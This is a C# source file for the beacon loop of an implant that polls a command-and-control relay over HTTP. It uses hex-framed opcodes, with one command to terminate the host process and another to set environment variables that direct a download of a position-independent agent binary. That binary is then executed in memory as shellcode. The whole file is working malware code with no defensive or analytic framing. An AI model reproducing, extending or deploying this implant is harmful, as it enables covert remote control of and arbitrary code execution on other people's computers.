using System;
using System.IO;
using System.Net;
using System.Text;

namespace CSharpAgent
{
    // The HTTP beacon loop — the SAME wire contract the JScript agent speaks (see the
    // jscript-agent repo's "Beacon contract (v2)", spoken against the HTTP relay's root):
    //
    //   • synchronous POST to H_URL carrying the X-Agent-* identity set on EVERY request;
    //   • request body = lowercase hex of the previous command's reply, empty when none;
    //   • every successful answer is 200 text/plain whose body is the hex of the next
    //     [opcode][payload] command — an empty body means nothing is queued, re-POST
    //     immediately (the relay's 20–30 s long-poll hold is the only sleep);
    //   • any non-200 answer or transport failure is FATAL — Run() returns and the
    //     deserialization below us unwinds. No retry loop: presence is re-established by
    //     re-delivery, not by burning CPU against a dead relay.
    internal static class Beacon
    {
        private static string _pendingHex = "";

        internal static void Run(string beaconUrl)
        {
            // Modern hosts/CDNs refuse anything older than TLS 1.2, and the int-cast form works
            // on CLR 2.0 where SecurityProtocolType.Tls12 doesn't exist (same trick C2Payload
            // uses for the A_URL download). Old schannel stacks reject the value — swallowed.
            try { ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; }
            catch { }
            try { ServicePointManager.Expect100Continue = false; }
            catch { }

            var headers = Identity.Build();

            // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
            // that the relay already delivered to the JScript agent on this machine; the
            // requester waiting on the relay's FIFO expects that command's u32 status on the
            // NEXT request body this session sends. That next request is OUR first POST, so it
            // carries 00000000 (chain completed) — the C2's delivery task sees success the
            // moment we start beaconing. Harmless when we were NOT started by an upgrade (the
            // relay drops an unsolicited response body with an empty awaiting FIFO).
            _pendingHex = "00000000"; // u32 LE status 0, hex — the owed reply

            while (true)
            {
                string responseHex;
                var ok = true;
                try { responseHex = Post(beaconUrl, headers, _pendingHex); }
                catch (Exception) { ok = false; responseHex = null; }
                if (!ok || responseHex == null) return; // fatal — mirrors the JScript agent

                _pendingHex = "";
                if (responseHex.Length == 0) continue;
                var reply = Dispatch(HexToBytes(responseHex));
                _pendingHex = reply == null ? "" : BytesToHex(reply);
            }
        }

        // Command dispatch. Exit (0x0A) never returns — it kills the host process (and any
        // agent injected into it: correct "terminate implant" semantics). NativeUpgrade (0x0C)
        // is this breed's ONE capability; everything else — the deserialization Upgrade
        // included — replies status 2 (unknown for this breed), mirroring how the JScript
        // agent treats every command but its own.
        private static byte[] Dispatch(byte[] command)
        {
            if (command.Length == 0) return U32Bytes(2);
            if (command[0] == 10)
            {
                Environment.Exit(0);
                return null; // unreachable — Exit never returns
            }
            if (command[0] == 12)
            {
                // Payload (ASCII text after the opcode): one NAME=value line per process env
                // var to set (the same env-line style the 0x0B headers use, minus the !d/!e
                // control lines and the blob body — no blank-line split, text runs to the end
                // of the frame). A_URL picks which PIC agent binary C2Payload downloads;
                // W_URL is the relay the injected WebSocket agent reads from the process env.
                // We stay resident afterwards: the injected agent runs in THIS process, so
                // exiting would kill it too.
                try
                {
                    var lines = Encoding.ASCII.GetString(command, 1, command.Length - 1).Split('\n');
                    for (var i = 0; i < lines.Length; i++)
                    {
                        var line = lines[i].TrimEnd('\r');
                        if (line.Length == 0) continue;
                        var eq = line.IndexOf('=');
                        if (eq <= 0) continue;
                        Environment.SetEnvironmentVariable(line.Substring(0, eq), line.Substring(eq + 1),
                            EnvironmentVariableTarget.Process);
                    }
                    var payload = C2Payload.Data;
                    if (payload.Length == 0) return U32Bytes(1); // no A_URL ⇒ nothing to inject
                    ShellcodeRunner.RunPayload(payload);
                    return U32Bytes(0);
                }
                catch
                {
                    return U32Bytes(1);
                }
            }
            return U32Bytes(2);
        }

        // One beacon round trip: POST bodyHex (ASCII hex text; empty string ⇒ zero-length
        // body), return the response body stripped to bare hex, or null when the answer is
        // anything but a clean 200. Transport-level failures throw to the caller.
        private static string Post(string url, string[][] headers, string bodyHex)
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "text/plain";
            // The relay holds each request 20–30 s server-side; keep generous headroom over
            // that window (the JScript agent's receive timeout is 45 s for the same reason).
            request.Timeout = 60000;
            request.ReadWriteTimeout = 60000;
            for (var i = 0; i < headers.Length; i++)
                request.Headers.Add(headers[i][0], headers[i][1]);

            var body = bodyHex.Length == 0 ? new byte[0] : Encoding.ASCII.GetBytes(bodyHex);
            request.ContentLength = body.Length;
            using (var stream = request.GetRequestStream())
                stream.Write(body, 0, body.Length);

            using (var response = (HttpWebResponse)request.GetResponse())
            {
                if (response.StatusCode != HttpStatusCode.OK) return null;
                using (var reader = new StreamReader(response.GetResponseStream(), Encoding.ASCII))
                    return StripWhitespace(reader.ReadToEnd());
            }
        }

        // --- Hex framing (lowercase, byte-pair text — identical to the JScript agent's) ---

        private const string HexDigits = "0123456789abcdef";

        internal static string BytesToHex(byte[] bytes)
        {
            var sb = new StringBuilder(bytes.Length * 2);
            for (var i = 0; i < bytes.Length; i++)
            {
                sb.Append(HexDigits[bytes[i] >> 4]);
                sb.Append(HexDigits[bytes[i] & 15]);
            }
            return sb.ToString();
        }

        internal static byte[] HexToBytes(string hex)
        {
            var count = 0;
            var chars = new char[hex.Length];
            for (var i = 0; i < hex.Length; i++)
            {
                var c = hex[i];
                if (c == ' ' || c == '\t' || c == '\r' || c == '\n') continue;
                chars[count++] = c;
            }
            var bytes = new byte[count / 2];
            for (var i = 0; i < bytes.Length; i++)
                bytes[i] = (byte)((Nibble(chars[i * 2]) << 4) | Nibble(chars[i * 2 + 1]));
            return bytes;
        }

        private static int Nibble(char c)
        {
            return c >= '0' && c <= '9' ? c - '0'
                : c >= 'a' && c <= 'f' ? c - 'a' + 10
                : c >= 'A' && c <= 'F' ? c - 'A' + 10
                : 0;
        }

        private static string StripWhitespace(string text)
        {
            if (text.IndexOf(' ') < 0 && text.IndexOf('\r') < 0 && text.IndexOf('\n') < 0 && text.IndexOf('\t') < 0)
                return text;
            var sb = new StringBuilder(text.Length);
            for (var i = 0; i < text.Length; i++)
            {
                var c = text[i];
                if (c != ' ' && c != '\t' && c != '\r' && c != '\n') sb.Append(c);
            }
            return sb.ToString();
        }

        private static byte[] U32Bytes(uint n)
        {
            return new[] { (byte)(n & 255), (byte)((n >> 8) & 255), (byte)((n >> 16) & 255), (byte)((n >> 24) & 255) };
        }

        private static string U32Hex(uint n)
        {
            return BytesToHex(U32Bytes(n));
        }
    }
}
